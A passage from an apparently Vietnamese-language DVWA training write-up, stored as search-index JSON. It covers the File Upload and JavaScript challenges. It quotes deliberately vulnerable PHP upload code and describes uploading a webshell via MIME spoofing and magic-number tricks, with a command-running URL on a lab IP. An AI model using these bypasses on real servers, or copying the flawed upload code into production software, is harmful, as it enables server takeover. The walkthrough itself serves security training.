'image/jpeg' ) { $img = imagecreatefromjpeg ( $uploaded_tmp ); imagejpeg ( $img , $temp_file , 100 ); } else { $img = imagecreatefrompng ( $uploaded_tmp ); imagepng ( $img , $temp_file , 9 ); } imagedestroy ( $img ); // Can we move the file to the web root from the temp folder? if ( rename ( $temp_file , ( getcwd () . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \"<pre><a href=' { $target_path }{ $target_file } '> { $target_file } </a> succesfully uploaded!</pre>\" ; } else { // No echo '<pre>Your image was not uploaded.</pre>' ; } // Delete any temp files if ( file_exists ( $temp_file ) ) unlink ( $temp_file ); } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 Exploition \u00b6 What we learned \u00b6 Bypass file extension (MIME): https://vi.wikipedia.org/wiki/MIME Bypass file extension (Change magic number): https://en.wikipedia.org/wiki/List_of_file_signatures More Information \u00b6 https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload https://www.acunetix.com/websitesecurity/upload-forms-threat/","title":"File Upload"},{"location":"dvwa/file-upload/#file-upload","text":"Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step. The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored. There are really two classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multi-part encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it. The other class of problem is with the file size or content. The range of problems here depends entirely on what the file is used for. See the examples below for some ideas about how files might be misused. To protect against this type of attack, you should analyse everything your application does with files and think carefully about what processing and interpreters are involved.","title":"File Upload"},{"location":"dvwa/file-upload/#security-level-low","text":"Source code vulnerabilities/upload/source/low.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $_FILES [ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } ?>","title":"Security Level: Low"},{"location":"dvwa/file-upload/#analysis","text":"Challenge n\u00e0y \u0111\u01a1n gi\u1ea3n th\u00f4i, h\u1ecd cung c\u1ea5p cho ta m\u1ed9t trang upload file (upload l\u00ean /hackable/uploads) t\u00f9y \u00fd, ta s\u1ebd t\u1eadn d\u1ee5ng n\u00f3 \u0111\u1ec3 upload file webshell","title":"Analysis"},{"location":"dvwa/file-upload/#exploition","text":"Upload th\u00e0nh c\u00f4ng \u0110\u1ec3 ta ki\u1ec3m ch\u1ee9ng file upload c\u00f3 ho\u1ea1t \u0111\u1ed9ng hay kh\u00f4ng ta c\u00f3 th\u1ec3 truy c\u1eadp th\u1eb3ng website http://192.168.37.162:4280/hackable/uploads/ws_ter_get.php?0=ls Ho\u1eb7c ta c\u00f3 th\u1ec3 t\u1eadn d\u1ee5ng challenge File Inclusion \u0111\u1ec3 ki\u1ec3m ch\u1ee9ng.","title":"Exploition"},{"location":"dvwa/file-upload/#security-level-medium","text":"Source code vulnerabilities/upload/source/medium.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES [ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; // Is it an image? if ( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) && ( $uploaded_size < 100000 ) ) { // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $_FILES [ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } ?>","title":"Security Level: Medium"},{"location":"dvwa/file-upload/#analysis_1","text":"\u1ede challenge n\u00e0y, h\u1ecd gi\u1edbi h\u1ea1n l\u1ea1i lo\u1ea1i file \u0111\u01b0\u1ee3c upload l\u00ean ch\u1ec9 l\u00e0 file \u1ea3nh (c\u1ee5 th\u1ec3 l\u00e0 JPEG ho\u1eb7c PNG). Nh\u01b0ng nh\u00ecn k\u0129 \u0111i, h\u1ecd check lo\u1ea1i file vi\u1ec7c l\u1ea5y \u0111\u1ecbnh d\u1ea1ng MIME file (gi\u00e1 tr\u1ecb \u0111\u01b0\u1ee3c t\u1ea3i l\u00ean trong tr\u01b0\u1eddng Content-Type ). Ta s\u1ebd fake gi\u00e1 tr\u1ecb MIME b\u1eb1ng vi\u1ec7c \u0111\u1ed5i extension file","title":"Analysis"},{"location":"dvwa/file-upload/#exploition_1","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, V\u00e0 file \u0111\u00e3 upload th\u00e0nh c\u00f4ng tr\u00ean h\u1ec7 th\u1ed1ng H\u00ecnh \u1ea3nh ki\u1ebfm ch\u1ee9ng vi\u1ec7c th\u1ef1c thi file","title":"Exploition"},{"location":"dvwa/file-upload/#security-level-high","text":"Source code vulnerabilities/upload/source/high.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_ext = substr ( $uploaded_name , strrpos ( $uploaded_name , '.' ) + 1 ); $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES [ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if ( ( strtolower ( $uploaded_ext ) == \"jpg\" || strtolower ( $uploaded_ext ) == \"jpeg\" || strtolower ( $uploaded_ext ) == \"png\" ) && ( $uploaded_size < 100000 ) && getimagesize ( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $uploaded_tmp , $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } ?>","title":"Security Level: High"},{"location":"dvwa/file-upload/#analysis_2","text":"\u1ede challenge n\u00e0y, h\u1ecd \u0111\u00e3 t\u00e1ch extension ra ri\u00eang v\u00e0 so s\u00e1nh. C\u1ee5 th\u1ec3 substr($uploaded_name, strrpos($uploaded_name, '.') + 1) : H\u00e0m substr \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 tr\u00edch xu\u1ea5t m\u1ed9t ph\u1ea7n c\u1ee7a chu\u1ed7i t\u1eeb v\u1ecb tr\u00ed \u0111\u00e3 x\u00e1c \u0111\u1ecbnh b\u1edfi strrpos($uploaded_name, '.') + 1 \u0111\u1ebfn cu\u1ed1i chu\u1ed7i. Trong tr\u01b0\u1eddng h\u1ee3p n\u00e0y, n\u00f3 tr\u00edch xu\u1ea5t ph\u1ea7n m\u1edf r\u1ed9ng c\u1ee7a t\u00ean t\u1ec7p. V\u00ed d\u1ee5, n\u1ebfu $uploaded_name l\u00e0 \"abc.png\", th\u00ec bi\u1ebfn $uploaded_ext s\u1ebd ch\u1ee9a \"png\".","title":"Analysis"},{"location":"dvwa/file-upload/#exploition_2","text":"Ta s\u1ebd d\u00f9ng magic number \u0111\u1ec3 bypass challenge n\u00e0y. V\u00e0 ta \u0111\u00e3 th\u00e0nh c\u00f4ng upload file webshell Check l\u1ea1i xem nh\u00e9 Magic number","title":"Exploition"},{"location":"dvwa/file-upload/#security-level-impossible","text":"Source code vulnerabilities/upload/source/impossible.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_ext = substr ( $uploaded_name , strrpos ( $uploaded_name , '.' ) + 1 ); $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES [ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES [ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/' ; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5 ( uniqid () . $uploaded_name ) . '.' . $uploaded_ext ; $temp_file = ( ( ini_get ( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir () ) : ( ini_get ( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5 ( uniqid () . $uploaded_name ) . '.' . $uploaded_ext ; // Is it an image? if ( ( strtolower ( $uploaded_ext ) == 'jpg' || strtolower ( $uploaded_ext ) == 'jpeg' || strtolower ( $uploaded_ext ) == 'png' ) && ( $uploaded_size < 100000 ) && ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && getimagesize ( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if ( $uploaded_type == 'image/jpeg' ) { $img = imagecreatefromjpeg ( $uploaded_tmp ); imagejpeg ( $img , $temp_file , 100 ); } else { $img = imagecreatefrompng ( $uploaded_tmp ); imagepng ( $img , $temp_file , 9 ); } imagedestroy ( $img ); // Can we move the file to the web root from the temp folder? if ( rename ( $temp_file , ( getcwd () . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \"<pre><a href=' { $target_path }{ $target_file } '> { $target_file } </a> succesfully uploaded!</pre>\" ; } else { // No echo '<pre>Your image was not uploaded.</pre>' ; } // Delete any temp files if ( file_exists ( $temp_file ) ) unlink ( $temp_file ); } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/file-upload/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/file-upload/#exploition_3","text":"","title":"Exploition"},{"location":"dvwa/file-upload/#what-we-learned","text":"Bypass file extension (MIME): https://vi.wikipedia.org/wiki/MIME Bypass file extension (Change magic number): https://en.wikipedia.org/wiki/List_of_file_signatures","title":"What we learned"},{"location":"dvwa/file-upload/#more-information","text":"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload https://www.acunetix.com/websitesecurity/upload-forms-threat/","title":"More Information"},{"location":"dvwa/javascript/","tags":["DVWA","JavaScript"],"text":"JavaScript \u00b6 About \u00b6 The attacks in this section are designed to help you learn about how JavaScript is used in the browser and how it can be manipulated. The attacks could be carried out by just analysing network traffic, but that isn't the point and it would also probably be a lot harder. Objective \u00b6 Simply submit the phrase \"success\" to win the level. Obviously, it isn't quite that easy, each level implements different protection mechanisms, the JavaScript included in the pages has to be analysed and then manipulated to bypass the protections. C\u00f4ng vi\u1ec7c c\u1ee7a ta cho to\u00e0n b\u1ed9 th\u1eed th\u00e1ch \u1edf ph\u1ea7n n\u00e0y l\u00e0 d\u1ecbch ng\u01b0\u1ee3c \u0111o\u1ea1n m\u00e3 JavaScript \u0111\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c gi\u00e1 tr\u1ecb v\u00e0 truy\u1ec1n n\u00f3 v\u00e0o th\u1ebb <input> c\u00f3 id l\u00e0 token . Security Level: Low \u00b6 Source code vulnerabilities/javascript/source/low.php <?php $page [ 'body' ] .= <<< EOF <script> /* MD5 code from here https://github.com/blueimp/JavaScript-MD5 */ !function(n){\"use strict\";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=\"\",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=\"\";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+=\"0123456789abcdef\".charAt(t>>>4&15)+\"0123456789abcdef\".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}\"function\"==typeof define&&define.amd?define(function(){return A}):\"object\"==typeof module&&module.exports?module.exports=A:n.md5=A}(this); function rot13(inp) { return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<=\"Z\"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}); } function generate_token() { var phrase = document.getElementById(\"phrase\").value; document.getElementById(\"token\").value = md5(rot13(phrase)); } generate_token(); </script> EOF ; ?> Analysis \u00b6 \u0110\u1ec3 \u00fd h\u00e0m generate_token () ta th\u1ea5y h\u00e0m n\u00e0y s\u1ebd t\u1ea1o token t\u1eeb keyword success m\u00e0 ta nh\u1eadp v\u00e0o. C\u00f4ng vi\u1ec7c c\u1ee7a ch\u00fang ta \u1edf th\u1eddi \u0111i\u1ec3m n\u00e0y l\u00e0 \u0111i\u1ec1u ch\u1ec9nh token h\u1ec7 th\u1ed1ng sinh ra th\u00e0nh token \u0111\u01b0\u1ee3c t\u1ea1o th\u00f4ng qua h\u00e0m generate_token () . Ch\u00fang ta s\u1ebd ho\u00e0n th\u00e0nh th\u1eed th\u00e1ch. Exploition \u00b6 F12 website ta th\u1ea5y d\u00f2ng token b\u1ecb hidden Ta s\u1ebd ti\u00eam 38581812b435834ebf84ebcc2c6424d6 (MD5(ROT13(success))) v\u00e0o token v\u00e0 s\u1ebd bypass \u0111\u01b0\u1ee3c challenge n\u00e0y. V\u00e0 xong, k\u1ebft qu\u1ea3 s\u1ebd hi\u1ec3n th\u1ecb nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi Security Level: Medium \u00b6 Source code vulnerabilities/javascript/source/medium.php <?php $page [ 'body' ] .= '<script src=\"' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/medium.js\"></script>' ; ?> vulnerabilities/javascript/source/medium.js function do_something ( e ){ for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } setTimeout ( function (){ do_elsesomething ( \"XX\" )}, 300 ); function do_elsesomething ( e ){ document . getElementById ( \"token\" ). value = do_something ( e + document . getElementById ( \"phrase\" ). value + \"XX\" )} Analysis \u00b6 Nh\u1edd https://reqbin.com/code/javascript ta s\u1ebd t\u00ecm \u0111\u01b0\u1ee3c token mong mu\u1ed1n. medium.js function do_something ( e ) { for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } setTimeout ( function () { do_elsesomething ( \"XX\" ) }, 300 ); function do_elsesomething ( e ) { var a = do_something ( e + \"successXX\" ) console . log ( a ) } Exploition \u00b6 Security Level: High \u00b6 Source code vulnerabilities/javascript/source/high.php <?php $page [ 'body' ] .= '<script src=\"' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/high.js\"></script>' ; ?> vulnerabilities/javascript/source/high.js var a = [ 'fromCharCode' , 'toString' , 'replace' , 'BeJ' , '\\x5cw+' , 'Lyg' , 'SuR' , '(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&&1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&&1c\\x202d===\\x271n\\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&&1c\\x202g===\\x271n\\x27&&2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&&2l.3P;q\\x201y=!Y.3H&&1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&&1x.1w&&1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)